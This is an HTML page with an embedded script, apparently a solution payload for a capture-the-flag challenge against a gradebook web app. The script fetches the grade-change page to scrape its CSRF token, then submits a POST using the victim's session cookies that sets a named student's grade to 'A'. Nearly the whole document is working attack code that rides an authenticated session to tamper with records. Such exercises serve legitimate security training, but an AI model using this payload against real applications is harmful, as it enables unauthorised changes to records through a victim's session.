<!DOCTYPE html>
<html>
<head>
    <title>Grade Change</title>
</head>
<body>
    <script>
        // First, fetch the grade-change page to get the CSRF token
        fetch('https://gradebook-app.ctf.csaw.io/grade-change')
            .then(response => response.text())
            .then(html => {
                // Parse the HTML to extract the CSRF token
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                const csrfToken = doc.querySelector('input[name="csrf_token"]').value;

                // Now, submit the POST request with the token
                const formData = new FormData();
                formData.append('student_id', 'cec61aee-395d-4281-af96-cfe05bda466e');
                formData.append('class_id', 'e522382b-7643-469c-ae52-ba488f5752c6');
                formData.append('grade', 'A');
                formData.append('csrf_token', csrfToken);

                fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
                    method: 'POST',
                    body: formData,
                    credentials: 'include'  // include cookies (session)
                })
                .then(response => response.text())
                .then(result => {
                    console.log('Grade change result:', result);
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            })
            .catch(error => {
                console.error('Error fetching CSRF token:', error);
            });
    </script>
</body>
</html>
